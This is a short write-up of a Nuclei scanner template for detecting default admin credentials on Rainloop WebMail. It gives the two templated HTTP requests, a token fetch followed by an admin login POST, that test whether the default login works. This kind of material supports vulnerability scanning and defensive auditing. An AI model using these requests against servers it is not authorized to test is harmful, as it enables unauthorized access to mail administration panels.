# Nuclei Template: Rainloop WebMail - Default Admin Login
**Template ID:** rainloop-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`rainloop-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Rainloop WebMail default admin login credentials were successful.

## Steps to reproduce / Exploit Payload
```http
GET /?/AdminAppData@no-mobile-0/0/15503332983847185/ HTTP/1.1
Host: {{Hostname}}

POST /?/Ajax/&q[]=/0/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Login={{user}}&Password={{pass}}&Action=AdminLogin&XToken={{token}}
```

## References
- https://github.com/RainLoop/rainloop-webmail/issues/28
